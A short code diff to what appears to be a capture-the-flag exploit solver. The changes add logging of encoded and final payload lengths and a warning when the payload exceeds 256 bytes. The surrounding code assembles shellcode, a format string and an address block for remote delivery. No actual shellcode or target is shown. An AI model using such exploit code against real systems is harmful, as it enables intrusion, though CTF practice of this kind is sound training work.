@@ -316,6 +316,8 @@ def solve():
     # Construct Payload
     full_encoded_target = sc + final_fmt.encode()
     
+    log.info(f"Encoded Target Length: {len(full_encoded_target)}")
+    
     # Decode
     try:
         input_payload = base64.a85decode(b"<~" + full_encoded_target + b"~>", adobe=True)
@@ -324,6 +326,10 @@ def solve():
         return
 
     final_payload = input_payload + addresses_block
+    
+    log.info(f"Final Payload Length: {len(final_payload)}")
+    if len(final_payload) > 256:
+        log.critical("Payload too long! This will likely fail.")
     
     if args.REMOTE:
         if len(sys.argv) < 4:
